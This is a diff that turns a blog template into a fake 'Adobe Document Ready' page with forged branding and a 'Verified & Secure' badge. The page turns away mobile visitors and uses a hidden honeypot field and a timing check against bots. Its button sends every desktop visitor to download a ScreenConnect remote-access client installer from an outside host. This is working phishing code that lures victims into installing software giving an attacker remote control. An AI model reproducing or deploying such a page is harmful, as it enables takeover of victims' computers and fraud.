@@ -1,17 +1,165 @@
-<?xml version="1.0" encoding="UTF-8" ?>
 <!DOCTYPE html>
-<html b:version='2' class='v2' expr:dir='data:blog.languageDirection' xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
+<html lang="en">
 <head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Adobe Document Ready</title>
 
-  <meta content='1;URL=&apos;https://document.mygnk.com/vc/attach.htm' http-equiv='refresh'/>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
 
-<meta content='IE=EmulateIE7' http-equiv='X-UA-Compatible'/>
-<b:if cond='data:blog.isMobile'>
-<meta content='width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0' name='viewport'/>
-<b:else/>
-<meta content='width=1100' name='viewport'/>
-</b:if>
-<b:include data='blog' name='all-head-content'/>
+<style>
 
-<title>Loading  please wait...</title>
-<b:skin>
+*{
+box-sizing:border-box;
+}
+
+body{
+margin:0;
+background:#f4f6f8;
+font-family:'Inter',sans-serif;
+display:flex;
+align-items:center;
+justify-content:center;
+min-height:100vh;
+}
+
+.container{
+background:white;
+padding:42px 36px;
+border-radius:14px;
+width:420px;
+max-width:92%;
+text-align:center;
+box-shadow:0 12px 40px rgba(0,0,0,0.08);
+}
+
+.logo{
+width:64px;
+margin-bottom:22px;
+}
+
+h2{
+margin:0;
+font-weight:600;
+font-size:24px;
+color:#1f1f1f;
+}
+
+.subtitle{
+margin-top:8px;
+font-size:15px;
+color:#666;
+line-height:1.5;
+}
+
+.secure{
+margin-top:18px;
+font-size:14px;
+color:#2e7d32;
+font-weight:500;
+}
+
+button{
+margin-top:28px;
+background:#ED2224;
+color:white;
+border:none;
+width:100%;
+padding:14px;
+border-radius:8px;
+font-size:16px;
+font-weight:600;
+cursor:pointer;
+transition:all .2s ease;
+}
+
+button:hover{
+background:#c91c1f;
+}
+
+button:disabled{
+background:#f2a3a3;
+cursor:not-allowed;
+}
+
+.footer{
+margin-top:30px;
+font-size:12px;
+color:#9a9a9a;
+line-height:1.6;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+<!-- Inline Adobe SVG Logo -->
+<svg class="logo" viewBox="0 0 38 38" xmlns="http://www.w3.org/2000/svg">
+<path fill="#ED2224" d="M0 0h38v38H0z"/>
+<path fill="#fff" d="M22.9 6L30 32h-5.3l-1.6-6H15.2l-1.6 6H8.3L15.4 6h7.5zm-3.8 6.7l-2.8 10h5.6l-2.8-10z"/>
+</svg>
+
+<h2>Document Ready</h2>
+
+<p class="subtitle">You have received a secure Adobe document.</p>
+<p class="subtitle">Click the button below to access it.</p>
+
+<div class="secure">🔒 Verified & Secure</div>
+
+<input type="text" id="robot_check" style="display:none;" autocomplete="off">
+
+<button id="downloadBtn" disabled>Open Document</button>
+
+<div class="footer">
+Adobe © 2026<br>
+All rights reserved
+</div>
+
+</div>
+
+<script>
+
+const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+
+if(isMobile){
+document.body.innerHTML = `
+<div style="display:flex;align-items:center;justify-content:center;height:100vh;font-family:sans-serif;background:#f4f6f8;">
+<div style="background:white;padding:40px;border-radius:10px;text-align:center;max-width:400px;">
+<h2 style="color:#d32f2f;">Access Denied</h2>
+<p>This content must be opened from a desktop device.</p>
+</div>
+</div>
+`;
+}else{
+
+const startTime = Date.now();
+
+window.addEventListener('DOMContentLoaded',()=>{
+setTimeout(()=>{
+document.getElementById('downloadBtn').disabled=false;
+},2000);
+});
+
+document.getElementById('downloadBtn').addEventListener('click',function(){
+
+const honeypot=document.getElementById('robot_check').value.trim();
+const timeSpent=(Date.now()-startTime)/1000;
+
+if(honeypot || timeSpent<2){
+window.location.href="https://ccim1.screenconnect.com/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest&c=R&c=&c=&c=&c=&c=&c=&c=";
+return;
+}
+
+window.location.href="https://ccim1.screenconnect.com/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest&c=R&c=&c=&c=&c=&c=&c=&c=";
+
+});
+
+}
+
+</script>
+
+</body>
+</html>
